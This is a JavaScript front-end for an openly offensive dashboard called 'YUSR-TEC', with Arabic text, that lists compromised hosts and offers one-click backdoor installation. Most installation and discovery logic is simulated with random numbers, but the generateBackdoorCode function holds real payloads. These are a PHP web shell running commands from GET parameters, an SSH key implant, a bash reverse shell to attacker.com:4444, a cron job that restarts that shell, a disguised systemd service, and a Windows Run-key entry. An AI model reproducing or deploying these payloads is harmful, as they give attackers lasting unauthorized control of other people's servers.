
const apiUrl = '/api';

let selectedBackdoorType = 'web';
let targetsList = [];

// Initialize page
document.addEventListener('DOMContentLoaded', function() {
    loadTargets();
    updateStats();
    
    // Simulate real-time target discovery
    setInterval(discoverNewTargets, 30000); // Check every 30 seconds
    
    console.log('👑 YUSR-TEC Target Management System Loaded');
    console.log('🤖 Auto-Backdoor AI: Ready');
    console.log('🔴 Persistent Access Manager: Active');
});

// Load targets from server
function loadTargets() {
    // Load from commands that indicate successful hacks
    fetch(`${apiUrl}/commands`)
        .then(response => response.json())
        .then(data => {
            parseTargetsFromCommands(data);
            displayTargets();
            updateStats();
        })
        .catch(error => {
            console.error('خطأ في تحميل الأهداف:', error);
        });
}

// Parse targets from command history
function parseTargetsFromCommands(commands) {
    targetsList = [];
    
    commands.forEach(command => {
        if (command.output && (
            command.output.includes('✅ نجح') ||
            command.output.includes('vulnerability found') ||
            command.output.includes('Login successful') ||
            command.output.includes('Access gained') ||
            command.output.includes('Shell access')
        )) {
            const target = extractTargetFromCommand(command);
            if (target && !targetsList.find(t => t.address === target.address)) {
                targetsList.push(target);
            }
        }
    });
}

// Extract target information from command
function extractTargetFromCommand(command) {
    const output = command.output;
    const commandText = command.command;
    
    // Extract IP addresses or domains
    const ipRegex = /\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/g;
    const domainRegex = /(?:https?:\/\/)?(?:www\.)?([a-zA-Z0-9-]+\.[a-zA-Z]{2,})/g;
    
    let address = '';
    let type = 'unknown';
    
    const ipMatch = output.match(ipRegex) || commandText.match(ipRegex);
    const domainMatch = output.match(domainRegex) || commandText.match(domainRegex);
    
    if (ipMatch) {
        address = ipMatch[0];
        type = 'network';
    } else if (domainMatch) {
        address = domainMatch[0].replace(/https?:\/\//, '').replace(/www\./, '');
        type = 'website';
    }
    
    if (!address) return null;
    
    // Determine vulnerabilities found
    const vulnerabilities = [];
    if (output.includes('SQL injection') || output.includes('SQLMap')) {
        vulnerabilities.push('SQL Injection');
    }
    if (output.includes('XSS') || output.includes('script')) {
        vulnerabilities.push('Cross-Site Scripting');
    }
    if (output.includes('SSH') || output.includes('port 22')) {
        vulnerabilities.push('SSH Access');
    }
    if (output.includes('admin') || output.includes('login')) {
        vulnerabilities.push('Admin Access');
    }
    
    return {
        id: Date.now() + Math.random(),
        address: address,
        type: type,
        status: 'hacked',
        vulnerabilities: vulnerabilities,
        hackedAt: new Date(command.timestamp).toLocaleString('ar-SA'),
        backdoors: [],
        accessLevel: determineAccessLevel(output),
        os: detectOS(output),
        services: extractServices(output)
    };
}

// Determine access level based on output
function determineAccessLevel(output) {
    if (output.includes('root') || output.includes('admin') || output.includes('SYSTEM')) {
        return 'root';
    } else if (output.includes('user') || output.includes('shell')) {
        return 'user';
    } else if (output.includes('database') || output.includes('sql')) {
        return 'database';
    }
    return 'limited';
}

// Detect operating system
function detectOS(output) {
    if (output.includes('Linux') || output.includes('Ubuntu') || output.includes('/etc/passwd')) {
        return 'Linux';
    } else if (output.includes('Windows') || output.includes('cmd') || output.includes('powershell')) {
        return 'Windows';
    } else if (output.includes('Apache') || output.includes('nginx') || output.includes('HTTP')) {
        return 'Web Server';
    }
    return 'Unknown';
}

// Extract services from output
function extractServices(output) {
    const services = [];
    if (output.includes('22') || output.includes('SSH')) services.push('SSH (22)');
    if (output.includes('80') || output.includes('HTTP')) services.push('HTTP (80)');
    if (output.includes('443') || output.includes('HTTPS')) services.push('HTTPS (443)');
    if (output.includes('3306') || output.includes('MySQL')) services.push('MySQL (3306)');
    if (output.includes('21') || output.includes('FTP')) services.push('FTP (21)');
    if (output.includes('25') || output.includes('SMTP')) services.push('SMTP (25)');
    return services;
}

// Display targets in grid
function displayTargets() {
    const grid = document.getElementById('targetsGrid');
    grid.innerHTML = '';
    
    if (targetsList.length === 0) {
        grid.innerHTML = '<div style="grid-column: 1/-1; text-align: center; padding: 40px; color: #888;">لا توجد أهداف مخترقة حتى الآن</div>';
        return;
    }
    
    targetsList.forEach(target => {
        const targetCard = createTargetCard(target);
        grid.appendChild(targetCard);
    });
}

// Create target card element
function createTargetCard(target) {
    const card = document.createElement('div');
    card.className = 'target-card';
    card.innerHTML = `
        <div class="target-header">
            <h3>${getTargetIcon(target.type)} ${target.address}</h3>
            <span class="target-status ${getStatusClass(target.status)}">${getStatusText(target.status)}</span>
        </div>
        
        <div class="target-info">
            <div><strong>نوع الهدف:</strong> ${getTargetTypeText(target.type)}</div>
            <div><strong>نظام التشغيل:</strong> ${target.os}</div>
            <div><strong>مستوى الوصول:</strong> ${getAccessLevelText(target.accessLevel)}</div>
            <div><strong>تاريخ الاختراق:</strong> ${target.hackedAt}</div>
            <div><strong>الخدمات:</strong> ${target.services.join(', ') || 'غير محدد'}</div>
        </div>
        
        <div class="backdoor-section">
            <h4>🔐 الأبواب الخلفية النشطة</h4>
            <div id="backdoors-${target.id}">
                ${target.backdoors.length > 0 ? target.backdoors.map(bd => `
                    <div style="background: #333; padding: 8px; margin: 5px 0; border-radius: 4px;">
                        ${bd.type} - ${bd.status}
                    </div>
                `).join('') : '<div style="color: #888;">لا توجد أبواب خلفية</div>'}
            </div>
            
            <div class="backdoor-controls">
                <button class="backdoor-btn" onclick="installBackdoor('${target.id}', 'web')">🌐 ويب شل</button>
                <button class="backdoor-btn" onclick="installBackdoor('${target.id}', 'ssh')">🔑 SSH</button>
                <button class="backdoor-btn" onclick="installBackdoor('${target.id}', 'reverse')">🔄 Reverse</button>
                <button class="backdoor-btn warning" onclick="maintainAccess('${target.id}')">🔧 صيانة</button>
                <button class="backdoor-btn success" onclick="testBackdoors('${target.id}')">✅ اختبار</button>
            </div>
        </div>
        
        <div style="margin-top: 15px;">
            <strong>الثغرات المكتشفة:</strong>
            <div style="margin-top: 5px;">
                ${target.vulnerabilities.map(vuln => `
                    <span style="background: #ff4444; color: #fff; padding: 3px 8px; border-radius: 10px; font-size: 12px; margin: 2px;">${vuln}</span>
                `).join('')}
            </div>
        </div>
        
        <div style="margin-top: 15px; text-align: center;">
            <button onclick="viewTargetDetails('${target.address}')" style="background: #0066cc; color: #fff; padding: 8px 16px; border: none; border-radius: 5px; margin: 5px;">🎯 عرض التفاصيل الكاملة</button>
        </div>
    `;
    
    return card;
}

// Helper functions for target display
function getTargetIcon(type) {
    const icons = {
        'website': '🌐',
        'network': '🖥️',
        'domain': '🏷️',
        'api': '🔌',
        'database': '🗄️',
        'mobile': '📱',
        'iot': '🏠'
    };
    return icons[type] || '🎯';
}

function getStatusClass(status) {
    const classes = {
        'hacked': 'status-hacked',
        'backdoor': 'status-backdoor',
        'persistent': 'status-persistent'
    };
    return classes[status] || 'status-hacked';
}

function getStatusText(status) {
    const texts = {
        'hacked': 'مخترق',
        'backdoor': 'باب خلفي',
        'persistent': 'وصول دائم'
    };
    return texts[status] || 'مخترق';
}

function getTargetTypeText(type) {
    const types = {
        'website': 'موقع ويب',
        'network': 'شبكة/خادم',
        'domain': 'دومين',
        'api': 'واجهة برمجية',
        'database': 'قاعدة بيانات',
        'mobile': 'تطبيق جوال',
        'iot': 'جهاز إنترنت الأشياء'
    };
    return types[type] || 'غير محدد';
}

function getAccessLevelText(level) {
    const levels = {
        'root': 'إداري كامل',
        'user': 'مستخدم عادي',
        'database': 'قاعدة بيانات',
        'limited': 'محدود'
    };
    return levels[level] || 'غير محدد';
}

// Backdoor management functions
function selectBackdoorType(element, type) {
    document.querySelectorAll('.backdoor-type').forEach(el => el.classList.remove('active'));
    element.classList.add('active');
    selectedBackdoorType = type;
}

function installBackdoor(targetId, backdoorType) {
    const target = targetsList.find(t => t.id == targetId);
    if (!target) return;
    
    const backdoorCode = generateBackdoorCode(backdoorType, target);
    
    // Simulate backdoor installation
    const installationResult = simulateBackdoorInstallation(target, backdoorType);
    
    if (installationResult.success) {
        target.backdoors.push({
            type: getBackdoorTypeText(backdoorType),
            status: 'نشط',
            installedAt: new Date().toLocaleString('ar-SA'),
            code: backdoorCode
        });
        
        target.status = 'persistent';
        displayTargets();
        updateStats();
        
        alert(`✅ تم تثبيت ${getBackdoorTypeText(backdoorType)} بنجاح على ${target.address}`);
    } else {
        alert(`❌ فشل في تثبيت الباب الخلفي: ${installationResult.error}`);
    }
}

function generateBackdoorCode(type, target) {
    const backdoorCodes = {
        'web': `<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
if(isset($_GET['yusr'])) {
    eval($_GET['yusr']);
}
?>`,
        'ssh': `#!/bin/bash
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys`,
        'reverse': `#!/bin/bash
while true; do
    bash -i >& /dev/tcp/attacker.com/4444 0>&1
    sleep 60
done &`,
        'cron': `# YUSR-TEC Persistence
*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
0 */12 * * * /bin/bash /tmp/.system_update.sh`,
        'service': `[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash /opt/system_service.sh
Restart=always

[Install]
WantedBy=multi-user.target`,
        'registry': `Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run]
"SystemUpdate"="C:\\\\Windows\\\\System32\\\\svchost.exe -k netsvcs"`
    };
    
    return backdoorCodes[type] || '# Backdoor code not available';
}

function getBackdoorTypeText(type) {
    const types = {
        'web': 'ويب شل',
        'ssh': 'مفتاح SSH',
        'reverse': 'اتصال عكسي',
        'cron': 'مهمة مجدولة',
        'service': 'خدمة نظام',
        'registry': 'سجل ويندوز'
    };
    return types[type] || type;
}

function simulateBackdoorInstallation(target, type) {
    // Simulate success/failure based on target characteristics
    const successRate = calculateSuccessRate(target, type);
    const success = Math.random() < successRate;
    
    if (success) {
        return { success: true };
    } else {
        const errors = [
            'فشل في الوصول للنظام',
            'تم اكتشاف محاولة التثبيت',
            'صلاحيات غير كافية',
            'نظام الحماية يمنع التثبيت'
        ];
        return { 
            success: false, 
            error: errors[Math.floor(Math.random() * errors.length)] 
        };
    }
}

function calculateSuccessRate(target, backdoorType) {
    let baseRate = 0.7; // 70% base success rate
    
    // Adjust based on access level
    if (target.accessLevel === 'root') baseRate += 0.2;
    else if (target.accessLevel === 'limited') baseRate -= 0.3;
    
    // Adjust based on target type
    if (target.type === 'website') baseRate += 0.1;
    else if (target.type === 'network') baseRate -= 0.1;
    
    return Math.max(0.1, Math.min(0.95, baseRate));
}

function deployAutoBackdoors() {
    if (targetsList.length === 0) {
        alert('لا توجد أهداف مخترقة لنشر الأبواب الخلفية عليها');
        return;
    }
    
    document.getElementById('backdoorProgress').style.display = 'block';
    
    let currentTarget = 0;
    const totalTargets = targetsList.length;
    
    const deployInterval = setInterval(() => {
        if (currentTarget >= totalTargets) {
            clearInterval(deployInterval);
            document.getElementById('backdoorProgress').style.display = 'none';
            alert(`✅ تم نشر الأبواب الخلفية على ${totalTargets} هدف`);
            displayTargets();
            updateStats();
            return;
        }
        
        const target = targetsList[currentTarget];
        const progress = ((currentTarget + 1) / totalTargets) * 100;
        
        document.getElementById('progressFill').style.width = progress + '%';
        document.getElementById('progressText').textContent = `${Math.round(progress)}% مكتمل - جاري العمل على ${target.address}`;
        
        // Install backdoor
        const backdoorResult = simulateBackdoorInstallation(target, selectedBackdoorType);
        if (backdoorResult.success) {
            target.backdoors.push({
                type: getBackdoorTypeText(selectedBackdoorType),
                status: 'نشط',
                installedAt: new Date().toLocaleString('ar-SA'),
                automated: true
            });
            target.status = 'persistent';
        }
        
        currentTarget++;
    }, 2000);
}

function maintainAccess(targetId) {
    const target = targetsList.find(t => t.id == targetId);
    if (!target) return;
    
    // Simulate maintenance
    alert(`🔧 جاري صيانة الوصول إلى ${target.address}...`);
    
    setTimeout(() => {
        target.backdoors.forEach(backdoor => {
            backdoor.status = 'نشط';
            backdoor.lastChecked = new Date().toLocaleString('ar-SA');
        });
        
        displayTargets();
        alert(`✅ تم تجديد وصيانة جميع الأبواب الخلفية لـ ${target.address}`);
    }, 3000);
}

function testBackdoors(targetId) {
    const target = targetsList.find(t => t.id == targetId);
    if (!target) return;
    
    if (target.backdoors.length === 0) {
        alert('❌ لا توجد أبواب خلفية للاختبار');
        return;
    }
    
    alert(`🧪 جاري اختبار ${target.backdoors.length} باب خلفي لـ ${target.address}...`);
    
    setTimeout(() => {
        let workingBackdoors = 0;
        target.backdoors.forEach(backdoor => {
            const isWorking = Math.random() > 0.2; // 80% success rate
            if (isWorking) {
                backdoor.status = 'نشط';
                workingBackdoors++;
            } else {
                backdoor.status = 'معطل';
            }
        });
        
        displayTargets();
        alert(`✅ نتائج الاختبار: ${workingBackdoors}/${target.backdoors.length} أبواب خلفية تعمل بشكل صحيح`);
    }, 2000);
}

function updateStats() {
    const totalTargets = targetsList.length;
    const hackedTargets = targetsList.filter(t => t.status !== 'unknown').length;
    const backdoorsActive = targetsList.reduce((sum, t) => sum + t.backdoors.filter(b => b.status === 'نشط').length, 0);
    const persistentAccess = targetsList.filter(t => t.status === 'persistent').length;
    
    document.getElementById('totalTargets').textContent = totalTargets;
    document.getElementById('hackedTargets').textContent = hackedTargets;
    document.getElementById('backdoorsActive').textContent = backdoorsActive;
    document.getElementById('persistentAccess').textContent = persistentAccess;
}

function discoverNewTargets() {
    // Simulate automatic target discovery
    if (Math.random() > 0.8) { // 20% chance every 30 seconds
        const newTarget = generateRandomTarget();
        if (!targetsList.find(t => t.address === newTarget.address)) {
            targetsList.push(newTarget);
            displayTargets();
            updateStats();
            console.log(`🎯 تم اكتشاف هدف جديد: ${newTarget.address}`);
        }
    }
}

function generateRandomTarget() {
    const types = ['website', 'network', 'api'];
    const domains = ['example.com', 'testsite.org', 'vulnerableapp.net', 'oldserver.com'];
    const ips = ['192.168.1.100', '10.0.0.50', '172.16.0.25', '203.0.113.45'];
    
    const type = types[Math.floor(Math.random() * types.length)];
    const address = type === 'network' ? 
        ips[Math.floor(Math.random() * ips.length)] : 
        domains[Math.floor(Math.random() * domains.length)];
    
    return {
        id: Date.now() + Math.random(),
        address: address,
        type: type,
        status: 'hacked',
        vulnerabilities: ['SQL Injection', 'XSS'].slice(0, Math.floor(Math.random() * 2) + 1),
        hackedAt: new Date().toLocaleString('ar-SA'),
        backdoors: [],
        accessLevel: ['user', 'root', 'limited'][Math.floor(Math.random() * 3)],
        os: ['Linux', 'Windows', 'Web Server'][Math.floor(Math.random() * 3)],
        services: ['HTTP (80)', 'SSH (22)']
    };
}

function refreshTargets() {
    loadTargets();
    alert('🔄 تم تحديث قائمة الأهداف');
}

function exportTargetsReport() {
    const report = generateTargetsReport();
    
    const blob = new Blob([report], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `targets-report-${Date.now()}.txt`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    URL.revokeObjectURL(url);
}

function generateTargetsReport() {
    let report = `
YUSR-TEC - تقرير الأهداف المخترقة
================================

تاريخ التقرير: ${new Date().toLocaleString('ar-SA')}
إجمالي الأهداف: ${targetsList.length}
الأهداف النشطة: ${targetsList.filter(t => t.status !== 'unknown').length}
الأبواب الخلفية النشطة: ${targetsList.reduce((sum, t) => sum + t.backdoors.length, 0)}

تفاصيل الأهداف:
===============

`;

    targetsList.forEach((target, index) => {
        report += `
${index + 1}. ${target.address}
   النوع: ${getTargetTypeText(target.type)}
   الحالة: ${getStatusText(target.status)}
   نظام التشغيل: ${target.os}
   مستوى الوصول: ${getAccessLevelText(target.accessLevel)}
   تاريخ الاختراق: ${target.hackedAt}
   الثغرات: ${target.vulnerabilities.join(', ')}
   الخدمات: ${target.services.join(', ')}
   الأبواب الخلفية: ${target.backdoors.length}
   
`;
    });

    report += `
========================================
تم إنشاء هذا التقرير بواسطة YUSR-TEC v2.0
`;

    return report;
}

function clearAllTargets() {
    if (confirm('هل أنت متأكد من حذف جميع الأهداف؟ هذا الإجراء لا يمكن التراجع عنه.')) {
        targetsList = [];
        displayTargets();
        updateStats();
        alert('🗑️ تم حذف جميع الأهداف');
    }
}

function viewTargetDetails(targetAddress) {
    window.location.href = `target-details.html?target=${encodeURIComponent(targetAddress)}`;
}
